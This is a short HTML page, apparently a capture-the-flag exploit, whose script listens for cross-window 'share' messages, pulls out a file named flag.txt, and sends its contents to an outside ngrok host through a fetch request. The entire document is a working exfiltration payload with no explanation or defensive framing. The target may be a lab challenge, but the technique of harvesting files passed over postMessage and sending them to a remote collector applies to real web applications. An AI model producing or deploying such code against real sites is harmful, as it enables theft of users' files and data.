<html>

<script>
window.addEventListener("message", async (event) => {
  if (event.data?.type === "share" && Array.isArray(event.data.files)) {
    const file = event.data.files.find(f => f.name === "flag.txt");

    if (file && file.blob) {
      const text = await file.blob.text(); 
      console.log("FLAG:", text);

  
      fetch('https://2c96-84-252-115-3.ngrok-free.app/collect?flag=' + encodeURIComponent(text));
    }
  }
});
</script>


</html>
